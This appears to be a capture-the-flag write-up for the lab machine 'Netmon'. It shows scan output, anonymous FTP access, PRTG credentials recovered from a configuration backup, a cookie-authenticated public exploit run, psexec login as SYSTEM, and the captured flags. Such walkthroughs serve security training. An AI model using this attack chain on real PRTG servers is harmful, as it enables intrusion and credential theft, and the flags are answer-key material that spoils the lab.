# Netmon

## IP

> 10.10.10.152
## nmap Scan

```
nmap -T4 -A 10.10.10.152 -Pn
```

```a
Nmap scan report for 10.10.10.152
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5m31s, deviation: 0s, median: 5m30s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-04T05:25:23
|_  start_date: 2021-08-04T04:57:28

```

## Open Ports
       
>21/tcp  open  ftp          Microsoft ftpd

FTP 

>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

SMB

> 135/tcp   open  msrpc        Microsoft Windows RPC

RPC

> 80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)

HTTP

## rcpinfo

```rpcinfo -p 10.10.10.152```

> 10.10.10.152: RPC: Remote system error — Connection refused

## smbclient
```smbclient -L \\\\10.10.10.152\\```

> Access Denied

## ftp

```ftp 10.10.10.152```

```
username = anonymous
password = anonymous
```

We are inside FTP lets check it

### Getting user.txt

```
cd Users\Public
get user.txt
```

> dd58ce67b49e15105e88096c8d9255a5

We do not have access to Administrator folder

### ftp info

```
msfconsole
search ftp_version
use 0
set rhosts 10.10.10.152
run
```

> [10.10.10.152:21       - FTP Banner: '220 Microsoft FTP Service\x0d\x0a'

Tried to exploit it, nothing useful

## smb

```
msfconsole
search smb_version
use 0
set rhosts 10.10.10.152
run
```

> [+] 10.10.10.152:445      - Host is running Windows 2016 Standard (build:14393) (name:NETMON) (signatures:optional)

Tried to exploit it, nothing useful

## HTTP

http://10.10.10.152/index.htm

The server is running  "PRTG Network Monitor" but we need to log in

I tried the default credentials and did not work

```
user = prtgadmid
pass = prtgadmid
```

I also searched for exploits and all of them need authentication

## HTTP & FTP

We can search online where PRTG stores the information and search for it using FTP, online I found that it is stored in the Paessler folder

Inside FTP

```
cd Users
ls -la
cd "All Users"
cd Paessler
```

And we get all the backups

> PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak

We check all the files looking for logging information and inside "PRTG Configuration.old.bak" we found the credentials

```
username = prtgadmin
password = PrTg@dmin2018
```

But it does not work

But if we try 2019.... it works!

```
username = prtgadmin
password = PrTg@dmin2019
```

Now we can get our cookie using burpsuite

> _ga=GA1.4.1977065840.1628054251;
>  _gid=GA1.4.836979986.1628054251; 
>  OCTOPUS1813713946=ezMzNEFCQUZFLTkzNkMtNEEzOC05Q0EwLTNDMDQ3QzVFNDY0OH0%3D

We can now use this exploit "https://www.exploit-db.com/exploits/46527"

We created a file called exp.sh with the exploit

```
~/Desktop/./exp.sh -u http://10.10.10.152 -c "_ga=GA1.4.1977065840.1628054251; _gid=GA1.4.836979986.1628054251; OCTOPUS1813713946=e0NFQ0IyOTY5LTc3NzctNDBCMi1COEM3LTI0RkZGRkNBREZGQX0%3D"
```

We now have an user and a password with administrator credentials inside the machine, lets access it!

```
username = pentest
password = P3nT3st!
```

### psexec.py

We can use https://github.com/SecureAuthCorp/impacket to access the machine

```psexec.py pentest:P3nT3st!@10.10.10.152```

We are in! and we are System!!

### Getting root.txt

```
cd c:\
cd Users
cd Administrator
cd Desktop
type root.txt
```

> 3018977fb944bf1878f75b879fba67cc